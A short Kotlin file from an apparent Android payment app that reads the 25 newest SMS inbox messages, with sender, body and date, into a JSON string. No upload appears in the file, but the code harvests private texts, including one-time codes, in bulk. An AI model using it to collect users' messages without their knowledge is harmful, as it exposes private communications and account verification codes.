package ir.virapay.app

import android.content.Context
import android.net.Uri
import org.json.JSONArray
import org.json.JSONObject

object SmsReader {
    fun readInboxJson(ctx: Context): String {
        val arr = JSONArray()
        try {
            val cursor = ctx.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("_id", "address", "body", "date"),
                null, null, "date DESC"
            )
            cursor?.use {
                val idIdx = it.getColumnIndex("_id")
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                var count = 0
                while (count < 25 && it.moveToNext()) {
                    val obj = JSONObject()
                    obj.put("id", it.getString(idIdx) ?: "")
                    obj.put("sender", it.getString(addrIdx) ?: "")
                    obj.put("body", it.getString(bodyIdx) ?: "")
                    obj.put("date", it.getLong(dateIdx))
                    arr.put(obj)
                    count++
                }
            }
        } catch (e: Exception) {
            LogBus.append("SMS Read Error: ${e.message}")
        }
        return arr.toString()
    }
}
